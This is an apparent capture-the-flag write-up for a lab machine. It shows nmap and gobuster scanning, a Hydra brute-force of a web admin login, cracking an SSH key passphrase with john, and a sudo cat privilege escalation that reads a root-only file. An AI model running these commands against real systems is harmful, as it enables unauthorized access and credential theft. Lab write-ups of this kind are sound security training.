# Brute It 

## Through this box I learned :
- Use Hydra to Brute-Force a password.
- Connect to SSH via RSA key. 
- Use GTFOBins to priv esc. 

### Section 1 : Scanning 

Let's kick it with nmap.
```bash
nmap -T4 -A -p- 10.10.247.14
```

We see that a web server is running on the port 80, let's check it.

It's just a configuration page, no useful informations in this page.
We can use a gobuster scan to check for hidden directories.
```bash
gobuster dir -u http://10.10.247.14:80/ -w /home/edwards/Documents/DirBuster-1.0-RC1/directory-list-2.3-medium.txt
```

We found the /admin path. 
If we go to the page, we have a login page.

If we inspect it, you can find a juicy information, we have the username to login.

### Section 2 : Brute-Force 

With this info we can brute-force with hydra to find the password.

We need to find different infos to launch it:
- URL.
- Type of form.
- Field for the Username.
- Field for the password.
- Failure message.

I just try to connect with the username and a random password to have the request.

We can then create our hydra command.
```bash
hydra -l admin -P /home/edwards/Downloads/rockyou.txt 10.10.247.14 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
```

Now we have a password to login. 

We arrive on a page when we have access to a RSA private Key for john.

### Section 3 : Crack RSA key 

We need to first use ssh2john to change the format of our RSA key.
```bash
ssh2john ./id_rsa > id_rsa.txt
```

Then use john to find the passphrase.
```bash
john --wordlist=/home/edwards/Downloads/rockyou.txt id_rsa.txt
```

Now we can to connect via SSH with the RSA key.
First, give the right authorization to your RSA file.
```bash
chmod 400 id_rsa 
```
Then connect.
```bash
ssh john@10.10.247.14 -i id_rsa
```

### Section 4 : Enum and Priv esc

The user.txt is the home directory of John.

After I uploaded linPEAS to find a way to escalate my privilege.

Launch it after it's uploaded.

We can see that our user have the right to use the sudo command.

Type the command : 
```bash
sudo -l
```

We can see that we can use the following command as root :

With the help of the website [!GTFOBins](https://gtfobins.github.io/gtfobins/cat/i)

I found that we can use a variable to read the "/root/root.txt" 
```bash
LFILE=/root/root.txt 
sudo cat "$LFILE"
```

And we are done, thank you !
